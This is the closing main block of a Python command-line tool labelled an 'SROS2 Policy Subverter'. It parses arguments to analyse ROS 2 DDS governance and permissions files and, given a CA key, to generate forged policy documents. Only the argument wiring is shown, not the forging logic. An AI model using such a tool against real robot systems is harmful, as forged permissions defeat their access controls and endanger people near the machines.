# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SROS2 Policy Subverter (Phase 5B Module 3)")
    parser.add_argument("--governance",  default=None, help="Path to governance.xml or .p7s")
    parser.add_argument("--permissions", default=None, help="Path to permissions.xml or .p7s")
    parser.add_argument("--ca-cert",     default=None, help="CA certificate PEM (for forgery signing)")
    parser.add_argument("--ca-key",      default=None, help="CA private key PEM (for forgery signing)")
    parser.add_argument("--forge",       action="store_true", help="Generate forged policy documents")
    parser.add_argument("--subject-name", default="", help="Subject name for forged permissions cert")
    parser.add_argument("--domain-id",   type=int, default=0, help="DDS Domain ID")
    parser.add_argument("-o", "--output", help="Save JSON output to file")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    subverter = PolicySubverter(verbose=args.verbose)
    result = subverter.analyze_files(
        governance_path=args.governance,
        permissions_path=args.permissions,
        ca_cert_path=args.ca_cert,
        ca_key_path=args.ca_key,
        forge=args.forge,
        subject_name=args.subject_name,
        domain_id=args.domain_id,
    )
    print_policy_report(result)
    if args.output:
        export_json(result, args.output)
